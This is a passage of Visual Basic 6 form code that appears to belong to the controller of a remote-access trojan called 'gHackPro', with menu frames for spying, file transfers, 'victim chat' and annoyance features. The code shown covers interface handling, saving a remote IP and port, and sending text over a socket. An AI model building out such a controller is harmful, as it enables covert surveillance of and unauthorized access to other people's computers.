FunAnnoyingFrame.Visible = False
LocalOptionsFrame.Visible = False

If Item.Index = 1 Then ConnectionFrame.Visible = True
If Item.Index = 2 Then InformationFrame.Visible = True
If Item.Index = 3 Then SpyingFrame.Visible = True
If Item.Index = 4 Then FileTransfersFrame.Visible = True
If Item.Index = 5 Then MessageBoxesFrame.Visible = True
If Item.Index = 6 Then VictimChatFrame.Visible = True
If Item.Index = 7 Then FunAnnoyingFrame.Visible = True
If Item.Index = 8 Then LocalOptionsFrame.Visible = True

End Sub



Private Sub Text1_GotFocus()
Text1.SelStart = 0: Text1.SelLength = Len(Text1)
Command11.Default = True
End Sub

Private Sub Text2_Change()
Command12.Default = True
End Sub

Private Sub Text3_Change()
CmdConnect.Default = True
End Sub

Private Sub Text3_GotFocus()
Text3.SelStart = 0: Text3.SelLength = Len(Text3)

End Sub

Private Sub Text4_GotFocus()
Text4.SelStart = 0: Text4.SelLength = Len(Text4)
Command11.Default = True
End Sub

Private Sub Timer1_Timer()
TimeLabel = Time$
End Sub

Private Sub Timer2_Timer()
PlayWave "d:\waves 2k\drloop3.wav"
End Sub

Private Sub txtRemoteIP_Change()
RegEdit.CreateKey "HKCU\Software\gHackPro\IP", txtRemoteIP
CmdConnect.Default = True
End Sub

Private Sub txtRemoteIP_GotFocus()
txtRemoteIP.SelStart = 0: txtRemoteIP.SelLength = Len(txtRemoteIP)
End Sub

Private Sub txtRemotePort_Change()
RegEdit.CreateKey "HKCU\Software\gHackPro\Port", txtRemotePort
CmdConnect.Default = True
End Sub

Public Sub Status(New_Status As String)
Label2 = " " & Time$ & ": " & New_Status
Form2.List1.AddItem Time$ & ":  " & New_Status, 0
End Sub

Public Sub Send(text As String)

On Error GoTo 10

'If IncBinary = True Then MsgBox "Binary transfer in progress", vbExclamation, "Error": Exit Sub

client.SendData text

Sleep 250

Exit Sub
10 MsgBox Err.Description, vbExclamation, "Error #" & Err.Number
End Sub

Private Sub txtRemotePort_GotFocus()
txtRemotePort.SelStart = 0: txtRemotePort.SelLength = Len(txtRemotePort)
End Sub
